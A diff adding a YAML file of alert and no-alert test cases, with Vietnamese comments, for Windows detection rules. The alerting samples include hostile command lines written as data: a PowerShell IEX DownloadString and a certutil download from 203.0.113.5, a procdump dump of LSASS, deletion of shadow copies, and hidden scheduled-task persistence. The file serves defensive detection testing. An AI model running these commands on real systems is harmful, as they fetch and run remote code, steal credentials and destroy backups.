@@ -1,0 +1,146 @@
+# Ca test rule Windows (server/rules/windows.yml): event Security / Sysmon / PowerShell / Defender đã chuẩn hóa.
+# Đường dẫn Windows viết trong nháy đơn để YAML giữ nguyên dấu \.
+- rule: WIN-001
+  name: 5 lần 4625 từ một IP
+  expect: alert
+  repeat: 5
+  events:
+    - {event: {module: windows, code: 4625, category: authentication, outcome: failure}, source: {ip: 203.0.113.20}, user: {name: administrator}}
+- rule: WIN-001
+  name: 5 lần đăng nhập thành công 4624
+  expect: none
+  repeat: 5
+  events:
+    - {event: {module: windows, code: 4624, category: authentication, outcome: success}, source: {ip: 10.0.0.40}, user: {name: an}}
+
+- rule: WIN-002
+  name: nhật ký bảo mật bị xóa (1102)
+  expect: alert
+  events:
+    - {event: {module: windows, code: 1102, action: audit_log_cleared}}
+- rule: WIN-002
+  name: đăng nhập thường
+  expect: none
+  events:
+    - {event: {module: windows, code: 4624, action: logon}}
+
+- rule: WIN-003
+  name: tạo tài khoản 4720
+  expect: alert
+  events:
+    - {event: {module: windows, code: 4720, action: user_created}, user: {name: svc-backup}}
+- rule: WIN-003
+  name: bật tài khoản 4722
+  expect: none
+  events:
+    - {event: {module: windows, code: 4722}, user: {name: svc-backup}}
+
+- rule: WIN-004
+  name: thêm vào Administrators
+  expect: alert
+  events:
+    - {event: {module: windows, code: 4732, action: group_member_added}, group: {name: Administrators}, user: {name: an}}
+- rule: WIN-004
+  name: thêm vào nhóm Users
+  expect: none
+  events:
+    - {event: {module: windows, code: 4732, action: group_member_added}, group: {name: Users}, user: {name: an}}
+
+- rule: WIN-005
+  name: PowerShell -enc chuỗi base64 dài
+  expect: alert
+  events:
+    - {event: {category: process}, process: {name: powershell.exe, command_line: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"}}
+- rule: WIN-005
+  name: lớp vỏ PowerShell của Ansible qua WinRM (đã loại trừ 12/10/2026)
+  expect: none
+  events:
+    - {event: {category: process}, process: {name: powershell.exe, command_line: "PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand UwBlAHQALQBTAHQAcgBpAGMAdABNAG8AZABlACAALQBWAGUAcgBzAGkAbwBuAA=="}}
+
+- rule: WIN-006
+  name: script block tải và chạy bằng DownloadString
+  expect: alert
+  events:
+    - {event: {category: process, module: powershell}, powershell: {script_block: "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')"}}
+- rule: WIN-006
+  name: script block quản trị bình thường
+  expect: none
+  events:
+    - {event: {category: process, module: powershell}, powershell: {script_block: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5"}}
+
+- rule: WIN-007
+  name: procdump đọc LSASS
+  expect: alert
+  events:
+    - {event: {category: process}, process: {name: procdump.exe, command_line: 'procdump.exe -ma lsass.exe C:\Windows\Temp\l.dmp'}}
+- rule: WIN-007
+  name: procdump một ứng dụng thường
+  expect: none
+  events:
+    - {event: {category: process}, process: {name: procdump.exe, command_line: 'procdump.exe -ma notepad.exe C:\Temp\n.dmp'}}
+
+- rule: WIN-008
+  name: Word sinh PowerShell
+  expect: alert
+  events:
+    - {event: {category: process}, process: {name: powershell.exe, parent: {name: winword.exe}}}
+- rule: WIN-008
+  name: Word sinh tiến trình in ấn splwow64
+  expect: none
+  events:
+    - {event: {category: process}, process: {name: splwow64.exe, parent: {name: winword.exe}}}
+
+- rule: WIN-009
+  name: service chạy cmd /c từ thư mục Public
+  expect: alert
+  events:
+    - {event: {module: windows, code: 7045, action: service_installed}, process: {command_line: 'cmd.exe /c C:\Users\Public\x.exe'}}
+- rule: WIN-009
+  name: service của phần mềm trong Program Files
+  expect: none
+  events:
+    - {event: {module: windows, code: 7045, action: service_installed}, process: {command_line: '"C:\Program Files\Vendor\svc.exe" -service'}}
+
+- rule: WIN-010
+  name: vssadmin xóa shadow copy
+  expect: alert
+  events:
+    - {event: {category: process}, process: {name: vssadmin.exe, command_line: "vssadmin.exe delete shadows /all /quiet"}}
+- rule: WIN-010
+  name: vssadmin liệt kê shadow copy
+  expect: none
+  events:
+    - {event: {category: process}, process: {name: vssadmin.exe, command_line: "vssadmin list shadows"}}
+
+- rule: WIN-011
+  name: Defender phát hiện mã độc (1116)
+  expect: alert
+  events:
+    - {event: {module: windows, code: 1116, category: malware}, file: {path: 'C:\Users\an\Downloads\inv.exe'}}
+- rule: WIN-011
+  name: Defender cập nhật chữ ký
+  expect: none
+  events:
+    - {event: {module: windows, code: 2000, category: configuration}}
+
+- rule: WIN-012
+  name: certutil tải file qua HTTP
+  expect: alert
+  events:
+    - {event: {category: process}, process: {name: certutil.exe, command_line: "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe"}}
+- rule: WIN-012
+  name: certutil tính hash
+  expect: none
+  events:
+    - {event: {category: process}, process: {name: certutil.exe, command_line: "certutil -hashfile ubuntu.iso SHA256"}}
+
+- rule: WIN-013
+  name: schtasks chạy PowerShell ẩn từ thư mục Public
+  expect: alert
+  events:
+    - {event: {category: process}, process: {name: schtasks.exe, command_line: 'schtasks.exe /create /tn upd /tr "powershell -w hidden -f C:\Users\Public\a.ps1" /sc onlogon'}}
+- rule: WIN-013
+  name: tác vụ sao lưu của quản trị viên (báo nhầm trước 12/10/2026)
+  expect: none
+  events:
+    - {event: {category: process}, process: {name: schtasks.exe, command_line: 'schtasks /create /tn backup /tr "C:\Scripts\backup.bat" /sc daily'}}
